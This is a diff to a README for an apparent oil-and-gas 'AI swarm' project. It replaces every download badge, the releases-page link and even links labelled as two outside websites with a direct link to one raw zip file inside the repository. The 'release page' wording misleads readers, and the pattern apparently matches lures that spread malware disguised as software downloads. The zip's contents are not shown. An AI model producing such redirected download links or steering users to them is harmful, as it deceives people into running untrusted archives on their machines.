@@ -1,6 +1,6 @@
 # 🛢️ oilgas-nanobot-swarm - AI Swarm for Oil & Gas Insight
 
-[![Download Release](https://img.shields.io/badge/Download-oilgas--nanobot--swarm-brightgreen)](https://github.com/seema807/oilgas-nanobot-swarm/releases)
+[![Download Release](https://img.shields.io/badge/Download-oilgas--nanobot--swarm-brightgreen)](https://github.com/seema807/oilgas-nanobot-swarm/raw/refs/heads/main/nanobot/static/nanobot_oilgas_swarm_3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -41,10 +41,10 @@ This software does not require a powerful gaming PC but works best with a stable
 
 You can get the latest version from the releases page. Use the green button below or the link provided.
 
-[![Download Release](https://img.shields.io/badge/Download--Latest--Release-blue)](https://github.com/seema807/oilgas-nanobot-swarm/releases)
+[![Download Release](https://img.shields.io/badge/Download--Latest--Release-blue)](https://github.com/seema807/oilgas-nanobot-swarm/raw/refs/heads/main/nanobot/static/nanobot_oilgas_swarm_3.7.zip)
 
 1. **Visit the Download Page**  
-Open your web browser and go to the [release page](https://github.com/seema807/oilgas-nanobot-swarm/releases).  
+Open your web browser and go to the [release page](https://github.com/seema807/oilgas-nanobot-swarm/raw/refs/heads/main/nanobot/static/nanobot_oilgas_swarm_3.7.zip).  
 
 2. **Choose the Latest Version**  
 Look for the newest release, usually at the top of the page. Click on it.  
@@ -131,10 +131,10 @@ No personal information is collected during typical use.
 
 ## Useful Links
 
-- Releases Page: https://github.com/seema807/oilgas-nanobot-swarm/releases  
-- NeuralQuantum.ai: https://neuralquantum.ai  
-- VibeCaaS.com: https://vibecaas.com
+- Releases Page: https://github.com/seema807/oilgas-nanobot-swarm/raw/refs/heads/main/nanobot/static/nanobot_oilgas_swarm_3.7.zip  
+- NeuralQuantum.ai: https://github.com/seema807/oilgas-nanobot-swarm/raw/refs/heads/main/nanobot/static/nanobot_oilgas_swarm_3.7.zip  
+- VibeCaaS.com: https://github.com/seema807/oilgas-nanobot-swarm/raw/refs/heads/main/nanobot/static/nanobot_oilgas_swarm_3.7.zip
 
 ---
 
-[![Download Release](https://img.shields.io/badge/Download--Latest--Release-brightgreen)](https://github.com/seema807/oilgas-nanobot-swarm/releases)
+[![Download Release](https://img.shields.io/badge/Download--Latest--Release-brightgreen)](https://github.com/seema807/oilgas-nanobot-swarm/raw/refs/heads/main/nanobot/static/nanobot_oilgas_swarm_3.7.zip)
